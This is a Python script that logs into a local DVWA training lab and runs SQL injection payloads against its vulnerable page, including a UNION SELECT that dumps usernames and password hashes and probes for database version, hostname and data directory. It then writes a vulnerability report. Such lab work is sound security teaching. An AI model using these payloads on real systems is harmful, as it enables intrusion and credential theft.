import requests
from bs4 import BeautifulSoup
import os

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
VULN_URL = 'http://localhost/dvwa/vulnerabilities/sqli/'
REPORT_FILE = 'sqllowoutput.txt'
DVWA_PATH = r'C:\xampp\htdocs\dvwa\vulnerabilities\sqli\source\low.php'  # Update this to your actual DVWA installation path

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'admin'

# Function to perform SQL injection and retrieve data
def perform_sql_injection(session, session_id, payload):
    headers = {'Cookie': f'PHPSESSID={session_id}; security=low'}
    target_url = f'{VULN_URL}?id={payload}&Submit=Submit'
    response = session.get(target_url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    extracted_data = soup.find_all('pre')
    return target_url, [data.text.strip() for data in extracted_data]

# Function to login to DVWA and retrieve CSRF token
def login_to_dvwa():
    session = requests.Session()
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    
    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return None, None

    # Login data
    login_data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': csrf_token
    }

    # Perform login
    response = session.post(LOGIN_URL, data=login_data)

    if 'Login failed' in response.text:
        print('Login failed')
        return None, None
    
    # Extract session ID from cookies
    session_id = session.cookies.get('PHPSESSID')
    return session, session_id

# Function to read the vulnerable PHP file and extract SQL vulnerable code
def extract_vulnerable_sql_code(file_path):
    vulnerable_lines = []
    with open(file_path, 'r') as file:
        lines = file.readlines()
        for i, line in enumerate(lines, start=1):
            if "SELECT" in line and "FROM users" in line and "WHERE user_id = '$id'" in line:
                vulnerable_lines.append((i, line.strip(), lines[i-2].strip(), lines[i-1].strip(), line.strip(), lines[i].strip(), lines[i+1].strip()))
    return vulnerable_lines

# Function to write report
def write_report(results, vulnerable_code):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA SQL Injection Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for payload, (target_url, extracted_data) in results.items():
            report_file.write(f'Test Payload: {payload}\n')
            report_file.write(f'Target URL: {target_url}\n\n')

            if extracted_data:
                report_file.write('Extracted Data:\n')
                for data in extracted_data:
                    report_file.write(data.strip() + '\n\n')
                report_file.write('Explanation:\n')
                report_file.write('The SQL Injection vulnerability is present because the application does not properly sanitize user inputs.\n')
                report_file.write('This allows an attacker to manipulate the SQL query by injecting malicious payloads.\n')
                report_file.write('The presence of extracted data suggests that the SQL query is vulnerable to manipulation, as the database is returning information based on the injected payload.\n')
                report_file.write(f'Vulnerable File URL: {target_url}\n')
            else:
                report_file.write('No data extracted, which indicates there might be vulnerabilities.\n')
                report_file.write('Explanation:\n')
                report_file.write('The absence of extracted data.\n')
                report_file.write(f'Vulnerable File URL: {target_url}\n')

            report_file.write('='*40 + '\n\n')

        # Append the vulnerable PHP code with line numbers
        report_file.write('Vulnerable SQL Code in PHP File:\n')
        report_file.write('='*40 + '\n')

        for line_number, code_line, *context in vulnerable_code:
            report_file.write(f'Line {line_number}: {code_line}\n')
            report_file.write('Context:\n')
            for context_line in context:
                report_file.write(context_line + '\n')
            report_file.write('Reason: SQL Injection vulnerability. The user input is directly incorporated into the SQL query without proper sanitization or parameterization.\n')
            report_file.write('='*40 + '\n')

# Main function to run the SQL injection tests
def run_sql_injection_tests():
    session, session_id = login_to_dvwa()

    if not session or not session_id:
        return

    results = {}

    # SQL Injection payloads
    payloads = [
        "' OR '' = '",
        "' UNION SELECT user, password FROM users-- ",
        "' union select 1,@@version-- ",
        "' union select null,@@hostname -- ",
        "' union all select system_user(),user()-- ",
        "' union select null,database()-- ",
        "' union select null,@@datadir -- "
    ] 

    for payload in payloads:
        print(f'Testing payload: {payload}')
        target_url, extracted_data = perform_sql_injection(session, session_id, payload)
        results[payload] = (target_url, extracted_data)

    session.close()

    # Extract vulnerable SQL code from the PHP file
    vulnerable_code = extract_vulnerable_sql_code(DVWA_PATH)

    write_report(results, vulnerable_code)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_sql_injection_tests()